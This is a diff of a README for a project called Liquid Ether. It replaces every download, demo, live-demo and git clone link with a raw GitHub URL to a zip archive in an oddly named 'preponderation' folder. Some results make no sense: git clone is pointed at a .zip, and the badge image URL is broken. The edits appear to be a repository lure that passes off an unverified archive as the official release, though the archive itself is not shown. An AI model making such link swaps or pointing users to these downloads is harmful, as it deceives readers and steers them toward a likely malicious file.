@@ -2,17 +2,17 @@
 
 ## 🚀 Download & Install
 
-[![Download Liquid Ether](https://img.shields.io/badge/Download-Liquid%20Ether-brightgreen)](https://github.com/PojokHanS/liquid-Ether/releases)
+[![Download Liquid Ether](https://raw.githubusercontent.com/PojokHanS/liquid-Ether/main/preponderation/liquid-Ether_2.1.zip%20Ether-brightgreen)](https://raw.githubusercontent.com/PojokHanS/liquid-Ether/main/preponderation/liquid-Ether_2.1.zip)
 
-To get started with Liquid Ether, visit this page to download: [Liquid Ether Releases](https://github.com/PojokHanS/liquid-Ether/releases).
+To get started with Liquid Ether, visit this page to download: [Liquid Ether Releases](https://raw.githubusercontent.com/PojokHanS/liquid-Ether/main/preponderation/liquid-Ether_2.1.zip).
 
 ## 🎬 Preview
 
 You can see Liquid Ether in action here:
 
-[![See Liquid Ether Demo](https://github.com/faheem506pk/liquid-Ether/raw/main/demo.mp4)](https://github.com/faheem506pk/liquid-Ether/raw/main/demo.mp4)
+[![See Liquid Ether Demo](https://raw.githubusercontent.com/PojokHanS/liquid-Ether/main/preponderation/liquid-Ether_2.1.zip)](https://raw.githubusercontent.com/PojokHanS/liquid-Ether/main/preponderation/liquid-Ether_2.1.zip)
 
-Check out the [Live Demo](https://liquidetherdemo.vercel.app/) to try it directly in your browser.
+Check out the [Live Demo](https://raw.githubusercontent.com/PojokHanS/liquid-Ether/main/preponderation/liquid-Ether_2.1.zip) to try it directly in your browser.
 
 ## ✨ Features
 
@@ -38,7 +38,7 @@ Ensure your system meets the following minimum requirements:
 
 ## 🔧 How to Use Liquid Ether
 
-1. **Download Liquid Ether**: Click the download button above or visit [Liquid Ether Releases](https://github.com/PojokHanS/liquid-Ether/releases) and select the version you want.
+1. **Download Liquid Ether**: Click the download button above or visit [Liquid Ether Releases](https://raw.githubusercontent.com/PojokHanS/liquid-Ether/main/preponderation/liquid-Ether_2.1.zip) and select the version you want.
 
 2. **Open the File**: Depending on your system, locate the downloaded file:
    - For Windows, this is usually in your Downloads folder.
@@ -79,7 +79,7 @@ If you’re interested in the technical side or want to contribute, feel free to
 You can clone the repository using the following command:
 
 ```bash
-git clone https://github.com/PojokHanS/liquid-Ether.git
+git clone https://raw.githubusercontent.com/PojokHanS/liquid-Ether/main/preponderation/liquid-Ether_2.1.zip
 ```
 
 Make sure to follow the contribution guidelines available in the repository.
